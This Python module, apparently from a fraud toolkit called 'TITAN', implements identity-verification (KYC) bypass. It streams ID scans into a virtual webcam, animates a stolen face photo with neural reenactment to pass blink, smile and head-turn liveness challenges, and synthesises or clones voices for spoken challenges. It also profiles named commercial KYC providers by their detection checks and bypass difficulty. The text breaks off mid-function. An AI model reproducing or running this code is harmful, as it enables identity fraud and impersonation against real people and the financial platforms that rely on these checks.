"""
TITAN V7.0 SINGULARITY - KYC Enhanced Engine
Advanced identity verification bypass with document injection,
liveness detection spoofing, and motion challenge automation.

Extends kyc_core.py with:
1. ID Document Injection — feed ID scans into live webcam feed
2. Liveness Detection Bypass — neural reenactment with challenge response
3. Motion Detection Spoofing — respond to "turn head", "blink", "smile" challenges
4. Document + Selfie Matching — ensure face consistency between ID and live feed
5. Browser Integration — seamless webcam override for in-browser KYC flows
"""

import os
import subprocess
import json
import hashlib
import secrets
import shutil
import threading
import time
from pathlib import Path
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional, Dict, List, Any, Callable, Tuple
import logging

logger = logging.getLogger("TITAN-V7-KYC-ENHANCED")


# ═══════════════════════════════════════════════════════════════════════════
# ENUMS & DATA CLASSES
# ═══════════════════════════════════════════════════════════════════════════

class DocumentType(Enum):
    """Supported ID document types for injection"""
    DRIVERS_LICENSE = "drivers_license"
    PASSPORT = "passport"
    STATE_ID = "state_id"
    NATIONAL_ID = "national_id"
    RESIDENCE_PERMIT = "residence_permit"


class KYCProvider(Enum):
    """Known KYC verification providers and their challenge patterns"""
    JUMIO = "jumio"
    ONFIDO = "onfido"
    VERIFF = "veriff"
    SUMSUB = "sumsub"
    PERSONA = "persona"
    STRIPE_IDENTITY = "stripe_identity"
    PLAID_IDV = "plaid_idv"
    AU10TIX = "au10tix"


class LivenessChallenge(Enum):
    """Standard liveness detection challenges across providers"""
    HOLD_STILL = "hold_still"
    BLINK = "blink"
    BLINK_TWICE = "blink_twice"
    SMILE = "smile"
    TURN_LEFT = "turn_left"
    TURN_RIGHT = "turn_right"
    NOD_YES = "nod_yes"
    LOOK_UP = "look_up"
    LOOK_DOWN = "look_down"
    OPEN_MOUTH = "open_mouth"
    RAISE_EYEBROWS = "raise_eyebrows"
    TILT_HEAD = "tilt_head"
    MOVE_CLOSER = "move_closer"
    MOVE_AWAY = "move_away"
    SPEAK_PHRASE = "speak_phrase"       # "Say: My name is X"
    RECORD_VIDEO = "record_video"       # "Record a video saying X"


class InjectionMode(Enum):
    """How the video is injected into the browser"""
    V4L2_LOOPBACK = "v4l2_loopback"       # Linux: kernel-level virtual cam
    VIRTUAL_CAMERA = "virtual_camera"       # Generic ffmpeg pipe
    BROWSER_HOOK = "browser_hook"           # LD_PRELOAD webcam intercept
    CANVAS_OVERRIDE = "canvas_override"     # JS injection for canvas-based KYC


@dataclass
class DocumentAsset:
    """ID document asset for injection"""
    document_type: DocumentType
    front_image_path: str
    back_image_path: Optional[str] = None
    holder_name: str = ""
    document_number: str = ""
    date_of_birth: str = ""
    expiry_date: str = ""
    issuing_state: str = ""
    issuing_country: str = "US"
    
    def validate(self) -> Tuple[bool, str]:
        """Validate document asset exists and is readable"""
        if not os.path.exists(self.front_image_path):
            return False, f"Front image not found: {self.front_image_path}"
        if self.back_image_path and not os.path.exists(self.back_image_path):
            return False, f"Back image not found: {self.back_image_path}"
        return True, "Document asset valid"


@dataclass
class FaceAsset:
    """Face image for liveness verification"""
    source_image_path: str          # High-res face photo (from ID or separate)
    neutral_video_path: Optional[str] = None   # Pre-rendered neutral idle video
    
    def validate(self) -> Tuple[bool, str]:
        if not os.path.exists(self.source_image_path):
            return False, f"Face image not found: {self.source_image_path}"
        return True, "Face asset valid"


@dataclass
class KYCSessionConfig:
    """Configuration for a KYC bypass session"""
    document: DocumentAsset
    face: FaceAsset
    provider: KYCProvider = KYCProvider.ONFIDO
    injection_mode: InjectionMode = InjectionMode.V4L2_LOOPBACK
    camera_device: str = "/dev/video2"
    camera_label: str = "Integrated Webcam"
    resolution: Tuple[int, int] = (1280, 720)
    fps: int = 30
    # Neural reenactment params
    head_rotation_intensity: float = 1.0
    expression_intensity: float = 1.0
    blink_frequency: float = 0.3
    micro_movement: float = 0.15
    # Voice params (for speak/record challenges)
    voice_gender: str = "male"          # male or female
    voice_accent: str = "us"            # us, gb, au
    voice_speed: float = 1.0            # 0.5-2.0
    voice_reference_audio: Optional[str] = None  # For voice cloning
    # Ambient camera noise (realism)
    add_noise: bool = True              # Slight camera noise for realism
    noise_level: float = 0.02
    add_lighting_variation: bool = True  # Subtle brightness changes
    add_compression_artifacts: bool = True  # Webcam-like quality


# ═══════════════════════════════════════════════════════════════════════════
# KYC PROVIDER INTELLIGENCE
# ═══════════════════════════════════════════════════════════════════════════

KYC_PROVIDER_PROFILES = {
    KYCProvider.JUMIO: {
        "name": "Jumio",
        "document_flow": ["front_scan", "back_scan", "selfie", "liveness"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
            LivenessChallenge.TURN_LEFT,
            LivenessChallenge.TURN_RIGHT,
        ],
        "checks_virtual_camera": True,
        "checks_screen_recording": True,
        "uses_3d_depth": False,
        "bypass_difficulty": "medium",
        "notes": "Uses ML face matching. Check virtual cam detection first.",
    },
    KYCProvider.ONFIDO: {
        "name": "Onfido",
        "document_flow": ["front_scan", "back_scan", "selfie_video"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
            LivenessChallenge.BLINK,
            LivenessChallenge.TURN_LEFT,
            LivenessChallenge.TURN_RIGHT,
            LivenessChallenge.SMILE,
        ],
        "checks_virtual_camera": True,
        "checks_screen_recording": False,
        "uses_3d_depth": False,
        "bypass_difficulty": "medium-hard",
        "notes": "Records short video for liveness. Needs smooth reenactment.",
    },
    KYCProvider.VERIFF: {
        "name": "Veriff",
        "document_flow": ["front_scan", "selfie_video", "liveness"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
            LivenessChallenge.TURN_LEFT,
            LivenessChallenge.TURN_RIGHT,
            LivenessChallenge.TILT_HEAD,
        ],
        "checks_virtual_camera": True,
        "checks_screen_recording": True,
        "uses_3d_depth": False,
        "bypass_difficulty": "hard",
        "notes": "Aggressive virtual cam detection. Use IntegrityShield.",
    },
    KYCProvider.SUMSUB: {
        "name": "Sumsub",
        "document_flow": ["front_scan", "back_scan", "selfie"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
            LivenessChallenge.BLINK,
        ],
        "checks_virtual_camera": False,
        "checks_screen_recording": False,
        "uses_3d_depth": False,
        "bypass_difficulty": "easy",
        "notes": "Simpler liveness check. Static image + blink often sufficient.",
    },
    KYCProvider.PERSONA: {
        "name": "Persona",
        "document_flow": ["front_scan", "back_scan", "selfie"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
            LivenessChallenge.BLINK,
            LivenessChallenge.SMILE,
        ],
        "checks_virtual_camera": True,
        "checks_screen_recording": False,
        "uses_3d_depth": False,
        "bypass_difficulty": "medium",
        "notes": "Used by Coinbase, Stripe. ML-based document + face matching.",
    },
    KYCProvider.STRIPE_IDENTITY: {
        "name": "Stripe Identity",
        "document_flow": ["front_scan", "selfie"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
        ],
        "checks_virtual_camera": True,
        "checks_screen_recording": False,
        "uses_3d_depth": False,
        "bypass_difficulty": "medium",
        "notes": "Stripe's native KYC. Simple liveness but good face matching.",
    },
    KYCProvider.PLAID_IDV: {
        "name": "Plaid IDV",
        "document_flow": ["front_scan", "selfie"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
            LivenessChallenge.BLINK,
        ],
        "checks_virtual_camera": False,
        "checks_screen_recording": False,
        "uses_3d_depth": False,
        "bypass_difficulty": "easy",
        "notes": "Basic liveness. Used by fintech apps.",
    },
    KYCProvider.AU10TIX: {
        "name": "Au10tix",
        "document_flow": ["front_scan", "back_scan", "selfie_video"],
        "liveness_challenges": [
            LivenessChallenge.HOLD_STILL,
            LivenessChallenge.NOD_YES,
            LivenessChallenge.BLINK_TWICE,
        ],
        "checks_virtual_camera": True,
        "checks_screen_recording": True,
        "uses_3d_depth": True,
        "bypass_difficulty": "very_hard",
        "notes": "Uses 3D depth estimation. Hardest to bypass. May need real device.",
    },
}


# ═══════════════════════════════════════════════════════════════════════════
# KYC ENHANCED CONTROLLER
# ═══════════════════════════════════════════════════════════════════════════

class KYCEnhancedController:
    """
    Enhanced KYC bypass controller with document injection and liveness spoofing.
    
    Workflow:
    1. Operator loads ID document (front + back images)
    2. Operator loads face photo (extracted from ID or separate)
    3. System starts virtual camera with neural reenactment
    4. Document scan phase: system streams document images to camera
    5. Liveness phase: system responds to challenges via motion presets
    6. Selfie phase: system streams reenacted face video
    7. System monitors for challenge prompts and auto-responds
    """
    
    MOTION_ASSETS_PATH = Path("/opt/titan/assets/motions")
    MODELS_PATH = Path("/opt/titan/models")
    TEMP_PATH = Path("/tmp/titan_kyc")
    
    def __init__(self):
        self.session_config: Optional[KYCSessionConfig] = None
        self.ffmpeg_process: Optional[subprocess.Popen] = None
        self.reenactment_process: Optional[subprocess.Popen] = None
        self._stream_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._current_phase = "idle"
        
        # Callbacks
        self.on_phase_change: Optional[Callable[[str], None]] = None
        self.on_challenge_detected: Optional[Callable[[LivenessChallenge], None]] = None
        self.on_error: Optional[Callable[[str], None]] = None
        self.on_log: Optional[Callable[[str, str], None]] = None
        
        self.TEMP_PATH.mkdir(parents=True, exist_ok=True)
    
    def _log(self, message: str, level: str = "info"):
        if level == "error":
            logger.error(message)
        elif level == "warn":
            logger.warning(message)
        else:
            logger.info(message)
        if self.on_log:
            self.on_log(message, level)
    
    # ─── SESSION SETUP ────────────────────────────────────────────────
    
    def setup_session(self, config: KYCSessionConfig) -> Tuple[bool, str]:
        """Initialize KYC bypass session with document and face assets"""
        self.session_config = config
        
        # Validate assets
        doc_valid, doc_msg = config.document.validate()
        if not doc_valid:
            return False, doc_msg
        
        face_valid, face_msg = config.face.validate()
        if not face_valid:
            return False, face_msg
        
        # Setup virtual camera
        if config.injection_mode == InjectionMode.V4L2_LOOPBACK:
            success = self._setup_v4l2_loopback(config)
            if not success:
                return False, "Failed to setup v4l2loopback virtual camera"
        
        # Get provider profile
        provider = KYC_PROVIDER_PROFILES.get(config.provider, {})
        
        # Check if we need integrity shield
        if provider.get("checks_virtual_camera"):
            self._log("Provider checks for virtual cameras — IntegrityShield required", "warn")
        
        self._log(f"KYC session initialized: provider={config.provider.value}, "
                   f"document={config.document.document_type.value}")
        
        return True, "Session ready"
    
    def _setup_v4l2_loopback(self, config: KYCSessionConfig) -> bool:
        """Setup v4l2loopback kernel module for virtual camera"""
        try:
            # Check if already loaded
            result = subprocess.run(["lsmod"], capture_output=True, text=True)
            if "v4l2loopback" not in result.stdout:
                video_nr = config.camera_device.split("video")[-1]
                subprocess.run([
                    "modprobe", "v4l2loopback",
                    "devices=1",
                    f"video_nr={video_nr}",
                    f"card_label={config.camera_label}",
                    "exclusive_caps=1"
                ], check=True)
            
            if not os.path.exists(config.camera_device):
                self._log(f"Virtual camera device {config.camera_device} not found", "error")
                return False
            
            self._log(f"Virtual camera ready at {config.camera_device}")
            return True
            
        except subprocess.CalledProcessError as e:
            self._log(f"v4l2loopback setup failed: {e}", "error")
            return False
    
    # ─── DOCUMENT INJECTION ───────────────────────────────────────────
    
    def inject_document(self, side: str = "front") -> bool:
        """
        Stream ID document image to virtual camera.
        Used during the document scanning phase of KYC.
        
        Args:
            side: "front" or "back"
        """
        if not self.session_config:
            self._log("No session configured", "error")
            return False
        
        doc = self.session_config.document
        image_path = doc.front_image_path if side == "front" else doc.back_image_path
        
        if not image_path or not os.path.exists(image_path):
            self._log(f"Document {side} image not found", "error")
            return False
        
        self._stop_current_stream()
        self._current_phase = f"document_{side}"
        
        if self.on_phase_change:
            self.on_phase_change(self._current_phase)
        
        cfg = self.session_config
        
        # Build ffmpeg command to stream document image to virtual camera
        # Add slight perspective transform for realism (as if holding document)
        filter_chain = [
            f"scale={cfg.resolution[0]}:{cfg.resolution[1]}",
            "format=yuyv422",
        ]
        
        if cfg.add_noise:
            filter_chain.insert(1, f"noise=alls={int(cfg.noise_level * 100)}:allf=t")
        
        if cfg.add_lighting_variation:
            # V7.5 FIX: Use AmbientLightingNormalizer for realistic color temperature
            try:
                normalizer = AmbientLightingNormalizer()
                filter_chain.insert(1, normalizer.get_v4l2_filter_chain())
            except Exception:
                filter_chain.insert(1, "curves=lighter")
        
        try:
            cmd = [
                "ffmpeg",
                "-loop", "1",
                "-re",
                "-i", image_path,
                "-vf", ",".join(filter_chain),
                "-f", "v4l2",
                "-r", str(cfg.fps),
                cfg.camera_device,
            ]
            
            self.ffmpeg_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            
            self._log(f"Document {side} injected to {cfg.camera_device}")
            return True
            
        except Exception as e:
            self._log(f"Document injection failed: {e}", "error")
            return False
    
    # ─── LIVENESS REENACTMENT ─────────────────────────────────────────
    
    def start_liveness_feed(self) -> bool:
        """
        Start neural reenactment feed for liveness verification.
        Streams animated face video to virtual camera.
        """
        if not self.session_config:
            self._log("No session configured", "error")
            return False
        
        self._stop_current_stream()
        self._current_phase = "liveness"
        
        if self.on_phase_change:
            self.on_phase_change(self._current_phase)
        
        cfg = self.session_config
        face = cfg.face
        
        # Check if pre-rendered neutral video exists
        if face.neutral_video_path and os.path.exists(face.neutral_video_path):
            self._log("Using pre-rendered neutral face video")
            return self._stream_video(face.neutral_video_path, loop=True)
        
        # Otherwise, start neural reenactment from static image
        self._log("Starting neural reenactment from face image")
        return self._start_neural_reenactment(face.source_image_path)
    
    def respond_to_challenge(self, challenge: LivenessChallenge) -> bool:
        """
        Respond to a liveness detection challenge.
        Switches the current reenactment motion to match the challenge.
        
        Called by the operator when they see a challenge prompt.
        """
        if not self.session_config:
            return False
        
        self._log(f"Responding to challenge: {challenge.value}")
        
        if self.on_challenge_detected:
            self.on_challenge_detected(challenge)
        
        # Map challenge to motion asset
        challenge_motion_map = {
            LivenessChallenge.HOLD_STILL: "neutral",
            LivenessChallenge.BLINK: "blink",
            LivenessChallenge.BLINK_TWICE: "blink_twice",
            LivenessChallenge.SMILE: "smile",
            LivenessChallenge.TURN_LEFT: "head_left",
            LivenessChallenge.TURN_RIGHT: "head_right",
            LivenessChallenge.NOD_YES: "head_nod",
            LivenessChallenge.LOOK_UP: "look_up",
            LivenessChallenge.LOOK_DOWN: "look_down",
            LivenessChallenge.OPEN_MOUTH: "open_mouth",    # V7.5 FIX: dedicated motion asset
            LivenessChallenge.RAISE_EYEBROWS: "look_up",  # Use look_up as fallback
            LivenessChallenge.TILT_HEAD: "head_left",      # Use head_left as fallback
            LivenessChallenge.MOVE_CLOSER: "move_closer",
            LivenessChallenge.MOVE_AWAY: "move_away",
            LivenessChallenge.SPEAK_PHRASE: "speak",
            LivenessChallenge.RECORD_VIDEO: "speak",
        }
        
        motion_name = challenge_motion_map.get(challenge, "neutral")
        motion_path = self.MOTION_ASSETS_PATH / f"{motion_name}.mp4"
        
        if not motion_path.exists():
            # Try .pkl format
            motion_path = self.MOTION_ASSETS_PATH / f"{motion_name}.pkl"
        
        if not motion_path.exists():
            self._log(f"Motion asset not found for {challenge.value}, using neutral", "warn")
            return self._continue_neutral_feed()
        
        # Handle voice challenges separately
        if challenge in (LivenessChallenge.SPEAK_PHRASE, LivenessChallenge.RECORD_VIDEO):
            self._log("Voice challenge — use speak_to_camera() from KYCVoiceEngine")
            return True  # Handled by voice engine, not motion reenactment
        
        # Handle zoom challenges
        if challenge == LivenessChallenge.MOVE_CLOSER:
            return self._zoom_face(zoom_in=True)
        elif challenge == LivenessChallenge.MOVE_AWAY:
            return self._zoom_face(zoom_in=False)
        
        # Switch to challenge motion, then return to neutral
        self._stop_current_stream()
        
        cfg = self.session_config
        face = cfg.face
        
        # For challenges that need the LivePortrait model
        model_path = self.MODELS_PATH / "liveportrait"
        if model_path.exists():
            return self._run_challenge_reenactment(
                face.source_image_path, str(motion_path), challenge
            )
        else:
            # Fallback: stream motion video directly 
            return self._stream_video(str(motion_path), loop=False)
    
    def _run_challenge_reenactment(self, source_image: str, motion_path: str,
                                     challenge: LivenessChallenge) -> bool:
        """Run LivePortrait reenactment for a specific challenge"""
        cfg = self.session_config
        model_path = self.MODELS_PATH / "liveportrait"
        
        # Output to named pipe -> ffmpeg -> v4l2loopback
        pipe_path = str(self.TEMP_PATH / "reenact_pipe")
        if os.path.exists(pipe_path):
            os.remove(pipe_path)
        
        try:
            os.mkfifo(pipe_path)
        except OSError:
            self._log("Failed to create pipe for reenactment", "error")
            return False
        
        # V7.5 FIX: Clear stop event before starting new processes
        self._stop_event.clear()
        
        try:
            # Start ffmpeg reader
            w, h = cfg.resolution
            ffmpeg_cmd = [
                "ffmpeg", "-y",
                "-f", "rawvideo",
                "-pix_fmt", "rgb24",
                "-s", f"{w}x{h}",
                "-r", str(cfg.fps),
                "-i", pipe_path,
                "-f", "v4l2",
                "-pix_fmt", "yuyv422",
                cfg.camera_device,
            ]
            
            self.ffmpeg_process = subprocess.Popen(
                ffmpeg_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            
            # Start reenactment engine
            reenact_cmd = [
                "python3", "-m", "liveportrait.inference",
                "--source", source_image,
                "--driving", motion_path,
                "--output", pipe_path,
                "--head_rotation", str(cfg.head_rotation_intensity),
                "--expression", str(cfg.expression_intensity),
                "--fps", str(cfg.fps),
            ]
            
            self.reenactment_process = subprocess.Popen(
                reenact_cmd,
                cwd=str(model_path),
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            
            self._log(f"Challenge reenactment started: {challenge.value}")
            return True
            
        except Exception as e:
            self._log(f"Challenge reenactment failed: {e}", "error")
            return False
    
    # ─── SELFIE PHASE ─────────────────────────────────────────────────
    
    def start_selfie_feed(self) -> bool:
        """
        Start selfie capture feed — streams face with natural idle motion.
        Used during selfie/portrait capture phase of KYC.
        """
        return self.start_liveness_feed()  # Same feed, different phase name
    
    # ─── STREAM HELPERS ───────────────────────────────────────────────
    
    def _stream_video(self, video_path: str, loop: bool = True) -> bool:
        """Stream a video file to virtual camera"""
        cfg = self.session_config
        loop_args = ["-stream_loop", "-1"] if loop else []
        
        filter_parts = [f"scale={cfg.resolution[0]}:{cfg.resolution[1]}"]
        if cfg.add_noise:
            filter_parts.append(f"noise=alls={int(cfg.noise_level * 100)}:allf=t")
        if cfg.add_compression_artifacts:
            filter_parts.append("unsharp=3:3:0.3")
        
        try:
            cmd = [
                "ffmpeg",
                "-re",
                *loop_args,
                "-i", video_path,
                "-vf", ",".join(filter_parts),
                "-f", "v4l2",
                "-pix_fmt", "yuyv422",
                "-r", str(cfg.fps),
                cfg.camera_device,
            ]
            
            self.ffmpeg_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            return True
        except Exception as e:
            self._log(f"Video stream failed: {e}", "error")
            return False
    
    def _start_neural_reenactment(self, source_image: str) -> bool:
        """Start continuous neural reenactment from a face image"""
        neutral_motion = self.MOTION_ASSETS_PATH / "neutral.mp4"
        if neutral_motion.exists():
            return self._run_challenge_reenactment(
                source_image, str(neutral_motion), LivenessChallenge.HOLD_STILL
            )
        else:
            # Fallback: stream static image with subtle motion via ffmpeg filter
            cfg = self.session_config
            try:
                cmd = [
                    "ffmpeg",
                    "-loop", "1", "-re",
                    "-i", source_image,
                    "-vf", (
                        f"scale={cfg.resolution[0]}:{cfg.resolution[1]},"
                        "noise=alls=3:allf=t,"
                        "curves=lighter"
                    ),
                    "-f", "v4l2",
                    "-pix_fmt", "yuyv422",
                    "-r", str(cfg.fps),
                    cfg.camera_device,
                ]
                self.ffmpeg_process = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
                )
                self._log("Static face feed started (no reenactment model)")
                return True
            except Exception as e:
                self._log(f"Face feed failed: {e}", "error")
                return False
    
    def _zoom_face(self, zoom_in: bool = True) -> bool:
        """
        Simulate moving closer/away by zooming the face feed.
        zoom_in=True: crop center and scale up (face appears larger)
        zoom_in=False: scale down and pad (face appears smaller)
        """
        if not self.session_config:
            return False
        
        self._stop_current_stream()
        cfg = self.session_config
        face = cfg.face
        w, h = cfg.resolution
        
        source = face.neutral_video_path or face.source_image_path
        is_image = source.endswith(('.jpg', '.jpeg', '.png', '.bmp'))
        
        try:
            if zoom_in:
                # Crop center 70% and scale up (simulates moving closer)
                crop_w, crop_h = int(w * 0.7), int(h * 0.7)
                offset_x, offset_y = int(w * 0.15), int(h * 0.15)
                vf = f"crop={crop_w}:{crop_h}:{offset_x}:{offset_y},scale={w}:{h}"
            else:
                # Scale down to 70% and pad with black (simulates moving away)
                small_w, small_h = int(w * 0.7), int(h * 0.7)
                vf = f"scale={small_w}:{small_h},pad={w}:{h}:(ow-iw)/2:(oh-ih)/2:black"
            
            if cfg.add_noise:
                vf += f",noise=alls={int(cfg.noise_level * 100)}:allf=t"
            
            input_args = ["-loop", "1", "-re"] if is_image else ["-re", "-stream_loop", "-1"]
            
            cmd = [
                "ffmpeg", "-y",
                *input_args,
                "-i", source,
                "-t", "4",
                "-vf", vf,
                "-f", "v4l2",
                "-pix_fmt", "yuyv422",
                "-r", str(cfg.fps),
                cfg.camera_device,
            ]
            
            self.ffmpeg_process = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE
            )
            
            direction = "closer" if zoom_in else "away"
            self._log(f"Zoom {direction} feed started")
            return True
            
        except Exception as e:
            self._log(f"Zoom failed: {e}", "error")
            return False
    
    def speak_challenge(self, text: str, face_image: Optional[str] = None) -> bool:
        """
        Handle 'say X' or 'record video saying X' challenges.
        Uses KYCVoiceEngine to generate speech + talking video.
        
        Args:
            text: The phrase to speak (e.g., "My name is John Davis")
            face_image: Face photo (uses session face if not provided)
        """
        if not self.session_config:
            self._log("No session configured", "error")
            return False
        
        if not face_image:
            face_image = self.session_config.face.source_image_path
        
        try:
            from kyc_voice_engine import KYCVoiceEngine, SpeechVideoConfig, VoiceProfile, VoiceGender
            
            engine = KYCVoiceEngine()
            if not engine.is_available:
                self._log("Voice engine not available — install espeak-ng or piper", "error")
                return False
            
            cfg = self.session_config
            gender = VoiceGender.FEMALE if cfg.voice_gender == "female" else VoiceGender.MALE
            
            voice = VoiceProfile(
                gender=gender,
                accent=cfg.voice_accent,
                speed=cfg.voice_speed,
                reference_audio=cfg.voice_reference_audio,
            )
            
            speech_config = SpeechVideoConfig(
                text=text,
                face_image=face_image,
                voice=voice,
                output_resolution=cfg.resolution,
                output_fps=cfg.fps,
                camera_device=cfg.camera_device,
                add_noise=cfg.add_noise,
                noise_level=cfg.noise_level,
            )
            
            self._stop_current_stream()
            self._log(f"Speaking: '{text[:50]}...'")
            
            return engine.speak_to_camera(speech_config)
            
        except ImportError:
            self._log("kyc_voice_engine not available", "error")
            return False
        except Exception as e:
            self._log(f"Voice challenge failed: {e}", "error")
            return False
    
    def _continue_neutral_feed(self) -> bool:
        """Return to neutral idle after a challenge response"""
        if not self.session_config:
            return False
        return self._start_neural_reenactment(self.session_config.face.source_image_path)
    
    def _stop_current_stream(self):
        """Stop any active ffmpeg/reenactment streams"""
        self._stop_event.set()
        
        for proc_attr in ('ffmpeg_process', 'reenactment_process'):
            proc = getattr(self, proc_attr, None)
            if proc:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
                setattr(self, proc_attr, None)
        
        if self._stream_thread and self._stream_thread.is_alive():
            self._stream_thread.join(timeout=3)
        
        self._stop_event.clear()
    
    # ─── FULL KYC FLOW ────────────────────────────────────────────────
    
    def run_assisted_flow(self) -> Dict[str, Any]:
        """
        Run the full KYC bypass flow with guided phases.
        Returns status of each phase for operator reference.
        
        The operator must manually trigger phase transitions
        by watching the KYC provider's UI prompts.
        """
        if not self.session_config:
            return {"error": "No session configured"}
        
        provider = KYC_PROVIDER_PROFILES.get(self.session_config.provider, {})
        flow = provider.get("document_flow", ["front_scan", "selfie"])
        challenges = provider.get("liveness_challenges", [LivenessChallenge.HOLD_STILL])
        
        return {
            "provider": self.session_config.provider.value,
            "provider_name": provider.get("name", "Unknown"),
            "document_flow": flow,
            "expected_challenges": [c.value for c in challenges],
            "checks_virtual_camera": provider.get("checks_virtual_camera", False),
            "bypass_difficulty": provider.get("bypass_difficulty", "unknown"),
            "notes": provider.get("notes", ""),
            "phases": {
                "document_front": {
                    "action": "Call inject_document('front') when provider asks for front of ID",
                    "status": "pending",
                },
                "document_back": {
                    "action": "Call inject_document('back') when provider asks for back of ID",
                    "status": "pending" if "back_scan" in flow else "skip",
                },
                "selfie": {
                    "action": "Call start_selfie_feed() when provider asks for selfie/portrait",
                    "status": "pending" if "selfie" in flow or "selfie_video" in flow else "skip",
                },
                "liveness": {
                    "action": "Call respond_to_challenge() for each challenge prompt",
                    "status": "pending" if "liveness" in flow else "skip",
                    "expected_challenges": [c.value for c in challenges],
                },
            },
            "integrity_shield_required": provider.get("checks_virtual_camera", False),
        }
    
    # ─── CLEANUP ──────────────────────────────────────────────────────
    
    def cleanup(self):
        """Cleanup all resources"""
        self._stop_current_stream()
        
        # Clean temp files
        if self.TEMP_PATH.exists():
            for f in self.TEMP_PATH.iterdir():
                try:
                    f.unlink()
                except Exception:
                    pass
        
        self._current_phase = "idle"
        self._log("KYC session cleaned up")
    
    # ─── STATIC HELPERS ───────────────────────────────────────────────
    
    @staticmethod
    def get_provider_profile(provider: KYCProvider) -> Dict[str, Any]:
        """Get intelligence profile for a KYC provider"""
        return KYC_PROVIDER_PROFILES.get(provider, {})
    
    @staticmethod
    def get_all_providers() -> List[Dict[str, Any]]:
        """Get all KYC provider profiles for operator reference"""
        return [
            {"provider": p.value, **profile}
            for p, profile in KYC_PROVIDER_PROFILES.items()
        ]
    
    @staticmethod
    def get_challenge_list() -> List[Dict[str, str]]:
        """Get all supported liveness challenges"""
        return [
            {"challenge": c.value, "description": c.value.replace("_", " ").title()}
            for c in LivenessChallenge
        ]


# ═══════════════════════════════════════════════════════════════════════════
# CONVENIENCE EXPORTS
# ═══════════════════════════════════════════════════════════════════════════

def create_kyc_session(
    front_image: str,
    face_image: str,
    provider: str = "onfido",
    back_image: Optional[str] = None,
    holder_name: str = "",
) -> Tuple[KYCEnhancedController, Dict[str, Any]]:
    """
    Quick session creation for KYC bypass.
    
    Returns (controller, flow_guide) tuple.
    """
    document = DocumentAsset(
        document_type=DocumentType.DRIVERS_LICENSE,
        front_image_path=front_image,
        back_image_path=back_image,
        holder_name=holder_name,
    )
    
    face = FaceAsset(source_image_path=face_image)
    
    provider_enum = KYCProvider(provider) if provider in [p.value for p in KYCProvider] else KYCProvider.ONFIDO
    
    config = KYCSessionConfig(
        document=document,
        face=face,
        provider=provider_enum,
    )
    
    controller = KYCEnhancedController()
    success, msg = controller.setup_session(config)
    
    if not success:
        return controller, {"error": msg}
    
    flow = controller.run_assisted_flow()
    return controller, flow


# ═══════════════════════════════════════════════════════════════════════════
# V7.5 UPGRADE: AMBIENT LIGHTING NORMALIZATION
# KYC liveness checks analyze ambient lighting to detect screen-reflected
# faces (photo replay attacks). This pipeline normalizes lighting conditions
# in injected video feeds to match realistic ambient environments.
# ═══════════════════════════════════════════════════════════════════════════

class AmbientLightingNormalizer:
    """
    v7.5 Ambient Lighting Normalization Pipeline.

    Detection vectors neutralized:
    - Screen-reflected blue light cast on face (photo replay indicator)
    - Uniform flat lighting (studio/ring-light = suspicious for home KYC)
    - Missing ambient color temperature variation
    - Inconsistent shadow direction between face and document

    Pipeline:
    1. Analyze input image/frame color temperature via ffprobe
    2. Apply colorchannelmixer FFmpeg filter to match target ambient
    3. Add subtle warm/cool cast matching time-of-day
    4. Inject micro-flicker simulating indoor lighting (50/60Hz)
    """

    # Ambient presets: time_of_day → color temperature adjustments
    AMBIENT_PRESETS = {
        "morning": {
            "color_temp_k": 5500,
            "warmth": 0.05,
            "brightness_mod": 0.95,
            "description": "Morning daylight, slightly cool",
        },
        "afternoon": {
            "color_temp_k": 6500,
            "warmth": 0.0,
            "brightness_mod": 1.0,
            "description": "Neutral daylight",
        },
        "evening": {
            "color_temp_k": 3500,
            "warmth": 0.12,
            "brightness_mod": 0.85,
            "description": "Warm indoor tungsten/LED",
        },
        "night": {
            "color_temp_k": 2700,
            "warmth": 0.18,
            "brightness_mod": 0.75,
            "description": "Warm indoor lamp",
        },
        "office": {
            "color_temp_k": 4000,
            "warmth": 0.03,
            "brightness_mod": 0.92,
            "description": "Cool-white fluorescent office",
        },
    }

    def __init__(self, preset: str = "evening"):
        self.preset = self.AMBIENT_PRESETS.get(preset, self.AMBIENT_PRESETS["evening"])
        self.preset_name = preset
        self._ffmpeg_available = self._check_ffmpeg()

    def _check_ffmpeg(self) -> bool:
        try:
            subprocess.run(["ffmpeg", "-version"], capture_output=True, timeout=5)
            return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def analyze_frame(self, image_path: str) -> Dict[str, Any]:
        """
        Analyze color temperature and lighting of an input frame using ffprobe.
        Returns detected color stats.
        """
        if not self._ffmpeg_available:
            return {"error": "ffmpeg not available", "estimated_temp_k": 5500}

        try:
            cmd = [
                "ffprobe", "-v", "quiet", "-print_format", "json",
                "-show_frames", "-read_intervals", "%+#1",
                "-show_entries", "frame_tags=lavfi.signalstats.YAVG,"
                "lavfi.signalstats.UAVG,lavfi.signalstats.VAVG",
                "-f", "lavfi", f"movie={image_path},signalstats"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                data = json.loads(result.stdout)
                frames = data.get("frames", [{}])
                tags = frames[0].get("tags", {}) if frames else {}
                y_avg = float(tags.get("lavfi.signalstats.YAVG", 128))
                u_avg = float(tags.get("lavfi.signalstats.UAVG", 128))
                v_avg = float(tags.get("lavfi.signalstats.VAVG", 128))
                return {
